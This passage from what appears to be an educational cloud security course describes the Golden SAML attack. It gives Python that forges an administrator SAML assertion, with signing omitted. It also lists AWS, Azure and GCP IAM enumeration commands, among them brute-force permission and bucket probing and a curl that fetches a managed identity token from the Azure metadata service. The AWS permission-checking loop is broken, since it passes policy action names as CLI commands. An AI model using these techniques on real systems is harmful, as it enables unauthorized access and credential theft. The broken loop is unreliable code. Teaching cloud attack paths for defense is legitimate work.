The Golden SAML attack (used in the SolarWinds breach) forges SAML assertions using the IdP's signing key:

```python
# Golden SAML Attack Concept (educational only)
# 
# Prerequisites: 
# 1. Compromise of the IdP's SAML signing certificate private key
# 2. Knowledge of the SAML claim structure
# 3. Target SP's entity ID
#
# Used in the SolarWinds Orion attack (SUNBURST):
# - Attackers compromised Microsoft AD FS signing key
# - Forged SAML tokens for any user in any federated application
# - Accessed O365 email, Azure resources, and on-premises systems

# Step 1: Extract AD FS signing key (after compromising the AD FS server)
# The key is stored in the AD FS configuration database
# Location: C:\Windows\ADFS\Microsoft.IdentityServer.ServiceHost.exe.config

# Step 2: Forge a SAML token
from cryptography.hazmat.primitives import serialization
from datetime import datetime, timedelta
import base64
import uuid

def forge_saml_assertion(signing_key, sp_entity_id, idp_entity_id, 
                          subject_name_id, attributes=None):
    """Forge a SAML assertion using the IdP's signing key"""
    assertion_id = f"_{uuid.uuid4().hex}"
    issued_at = datetime.utcnow().isoformat() + "Z"
    not_before = datetime.utcnow().isoformat() + "Z"
    not_on_or_after = (datetime.utcnow() + timedelta(hours=1)).isoformat() + "Z"
    
    assertion = f"""<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="{assertion_id}" IssueInstant="{issued_at}" Version="2.0">
      <saml:Issuer>{idp_entity_id}</saml:Issuer>
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
          {subject_name_id}
        </saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}" 
            Recipient="{sp_entity_id}"/>
        </saml:SubjectConfirmation>
      </saml:Subject>
      <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_on_or_after}">
        <saml:AudienceRestriction>
          <saml:Audience>{sp_entity_id}</saml:Audience>
        </saml:AudienceRestriction>
      </saml:Conditions>
      <saml:AttributeStatement>
        <saml:Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
          <saml:AttributeValue>Administrator</saml:AttributeValue>
        </saml:Attribute>
      </saml:AttributeStatement>
      <saml:AuthnStatement AuthnInstant="{issued_at}">
        <saml:AuthnContext>
          <saml:AuthnContextClassRef>
            urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
          </saml:AuthnContextClassRef>
        </saml:AuthnContext>
      </saml:AuthnStatement>
    </saml:Assertion>"""
    
    # Sign with the compromised key (omitted — requires XML Signature generation)
    return assertion

# The forged assertion can then be POST'd to the SAML ACS URL of any
# federated application, granting access as any user.
```

---

## 10. IAM Enumeration Techniques

### 10.1 AWS IAM Enumeration

```bash
# Phase 1: Who am I?
aws sts get-caller-identity

# Phase 2: What can I do? (Permission enumeration)
# Technique 1: list-attached-policies
aws iam list-attached-user-policies --user-name <username>
aws iam list-attached-group-policies --group-name <groupname>
aws iam list-attached-role-policies --role-name <rolename>

# Technique 2: simulate-principal-policy (if allowed)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/username \
  --action-names s3:GetObject s3:PutObject iam:CreateUser \
  --resource-arns arn:aws:s3:::*

# Technique 3: Brute-force permission checking (common in pentesting)
# This is noisy but effective if iam:SimulatePrincipalPolicy is denied
for action in s3:GetObject s3:PutObject s3:DeleteObject s3:ListBucket \
             iam:CreateUser iam:CreateRole iam:AttachRolePolicy \
             ec2:RunInstances ec2:DescribeInstances \
             lambda:CreateFunction lambda:InvokeFunction \
             secretsmanager:GetSecretValue; do
  aws $action 2>/dev/null && echo "$action: ALLOWED" || echo "$action: DENIED"
done

# Technique 4: kubectl auth can-i (for Kubernetes)
# See 02b_kubernetes_security.md for details

# Phase 3: What resources exist?
# S3 bucket enumeration (often does not require authentication)
aws s3 ls --no-sign-request 2>/dev/null
for bucket in $(cat bucket-wordlist.txt); do
  aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "$bucket: PUBLIC"
done

# EBS snapshot enumeration
aws ec2 describe-snapshots --owner-ids amazon --public 2>/dev/null
aws ec2 describe-snapshots --restorable-by-user-ids all 2>/dev/null

# AMI enumeration
aws ec2 describe-images --owners amazon --filters "Name=is-public,Values=true"
```

### 10.2 Azure AD Enumeration

```bash
# Phase 1: Who am I?
az ad signed-in-user show

# Phase 2: Directory enumeration
az ad user list --query "[].{name:displayName, upn:userPrincipalName}"
az ad group list --query "[].{name:displayName, id:id}"
az ad sp list --query "[].{name:displayName, appId:appId}"
az ad app list --query "[].{name:displayName, appId:appId}"

# Phase 3: RBAC enumeration
az role assignment list --all --query "[].{principal:principalName, role:roleDefinitionName, scope:scope}"

# Phase 4: Conditional access enumeration (requires Privileged Auth Admin)
az rest --method GET --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"

# Phase 5: App registration and consent enumeration
az ad app list --query "[].{name:displayName, appId:appId, oauth2Permissions:oauth2Permissions}"
# Check for illicit consent grants:
az ad app list --query "[?requiredResourceAccess[].resourceAccess[].type=='Role']"

# Phase 6: Managed identity enumeration (if on Azure VM)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use the token to enumerate subscriptions and resources
 az account list --output table
 az resource list --output table
```

### 10.3 GCP IAM Enumeration

```bash
# Phase 1: Who am I?
gcloud auth list
gcloud config get-value account

# Phase 2: Project enumeration
gcloud projects list
gcloud projects get-iam-policy <project-id>

# Phase 3: Service account enumeration
gcloud iam service-accounts list --project=<project-id>
gcloud iam service-accounts get-iam-policy <sa-email> --project=<project-id>

# Phase 4: Role enumeration
gcloud iam roles list --project=<project-id>
gcloud iam roles describe <role-name> --project=<project-id>

# Phase 5: Resource enumeration
gcloud compute instances list --project=<project-id>
gcloud storage ls --project=<project-id>
gsutil ls -r gs://<bucket-name>

# Phase 6: Organization policy enumeration (if org-level access)
gcloud org-policies list --organization=<org-id>
```

### 10.4 Stealthy Enumeration Techniques

```bash
# AWS: Use error messages to enumerate
# If you get "AccessDenied" vs "NoSuchBucket", you can determine bucket existence
aws s3 ls s3://likely-exists --no-sign-request
# AccessDenied → bucket exists but access denied
# NoSuchBucket → bucket does not exist
# AccessDenied (different error format) → bucket exists with specific policy

# Azure: Use MS Graph to enumerate without admin
# GET https://graph.microsoft.com/v1.0/users
# GET https://graph.microsoft.com/v1.0/groups
# GET https://graph.microsoft.com/v1.0/applications

# GCP: Use OAuth2 token introspection
curl -H "Authorization: Bearer <token>" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo"

# Cross-platform: DNS reconnaissance
# AWS: <bucket-name>.s3.amazonaws.com
# Azure: <storage-account>.blob.core.windows.net
# GCP: <bucket-name>.storage.googleapis.com

# Subdomain enumeration for cloud resources
subfinder -d target.com -silent | grep -E '\.s3\.|\.blob\.|\.storage\.'
```

---

## 11. Cross-Platform IAM Attack Path Mapping

### 11.1 Universal Attack Patterns

Regardless of the cloud provider, IAM attacks follow similar patterns:

```
+------------------------------------------------------------------+
|                    Universal IAM Attack Path                      |
|                                                                    |
|  Credential Access          Persistence                            |
|  +-----------+             +-----------+                           |
|  | Metadata  |             | Backdoor  |                           |
|  | Service   |------------→| IAM Role  |                           |
|  | (169.254) |             | / SA Key  |                           |
|  +-----------+             +-----------+                           |
|        |                        ^                                  |
|        v                        |                                  |
|  +-----------+             +-----------+                           |
|  | Privilege |             | Lateral   |                           |
|  | Escalation|→→→→→→→→→→→| Movement  |                           |
|  +-----------+             +-----------+                           |
|        |                        |                                  |
|        v                        v                                  |
|  +-----------+             +-----------+                           |
|  | Resource  |------------→| Data      |                           |
|  | Access    |             | Exfiltr-  |                           |
|  +-----------+             | ation     |                           |
|                            +-----------+                           |
+------------------------------------------------------------------+
```

### 11.2 Cross-Provider Comparison

| Attack Phase | AWS | Azure | GCP |
|---|---|---|---|
| **Initial Access** | SSRF → IMDS | SSRF → IMDS/Metadata | SSRF → Metadata |
| **Credential Theft** | IAM role credentials from IMDS | Managed identity tokens | Service account tokens from metadata |
| **Privilege Escalation** | iam:PassRole chains | Application Admin → SP creation | iam.serviceAccountKeys.create |
| **Lateral Movement** | Cross-account AssumeRole | Cross-tenant B2B access | Workload Identity Federation |
| **Persistence** | Lambda layers, backdoor roles | Backdoor app registrations | Org policy modification |
| **Exfiltration** | S3 bucket download | Blob storage access | Cloud Storage access |

### 11.3 Key Takeaways

1. **IAM is the new perimeter** — every cloud resource is protected by IAM, and IAM misconfigurations are the #1 attack vector across all providers.

2. **Trust relationships are the attack surface** — cross-account/cross-tenant trust policies, OIDC federation, and SAML assertions all introduce trust boundaries that can be exploited.

3. **Credential exfiltration is the primary goal** — once an attacker obtains IAM credentials (via SSRF, metadata service, or direct access), they gain persistent, often privileged, access to the cloud environment.

4. **Defense in depth requires multiple controls** — IMDSv2, permission boundaries, SCPs, conditional access, organization policies, and audit logging must be layered together.

5. **Enumeration is always possible** — even with perfect IAM hardening, the error messages and API behavior of cloud services leak information about resource existence and permissions.

**Cross-reference**: The Linux Kernel track (`linux_kernel/docs/02a_vuln_classes.md`) covers the primitives (namespaces, cgroups, capabilities) that underpin container isolation, while the Zero Day track (`zero_day/docs/`) covers the exploit development techniques used against hypervisor and container runtime vulnerabilities. The Web Security track (`web_security/docs/`) covers SSRF in depth, which is the primary initial access vector for cloud metadata service attacks.

---

*Next: [02a — Container Security](02a_container_security.md)*

---

## References

1. AWS. "IAM Policy Evaluation Logic." *Amazon Web Services*. 2024. https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html
2. Rhino Security Labs. "AWS IAM Privilege Escalation Methods." *Rhino Security Labs*. 2019. https://rhinosecuritylabs.com/aws-privilege-escalation-methods-mitigation/
3. Microsoft. "Azure AD Conditional Access." *Microsoft Learn*. 2024. https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/
4. Google Cloud. "IAM Best Practices." *Google Cloud*. 2024. https://cloud.google.com/iam/docs/best-practices-for-managing-service-account-keys
5. CyberArk. "Golden SAML Attack." *CyberArk*. 2020. https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps
6. Praetorian. "GCP IAM Enumeration and Privilege Escalation." *Praetorian*. 2021. https://www.praetorian.com/blog/
7. AWS. "AssumeRole API Reference." *Amazon Web Services*. 2024. https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
8. Amazon. "Security Token Service (STS)." *Amazon Web Services*. 2024. https://docs.aws.amazon.com/STS/latest/APIReference/
9. OWASP. "Broken Access Control." *Open Worldwide Application Security Project*. 2024. https://owasp.org/Top10/A01_2021-Broken_Access_Control/
10. MITRE. "ATT&CK: Cloud IAM Techniques." *MITRE Corporation*. 2024. https://attack.mitre.org/tactics/TA0004/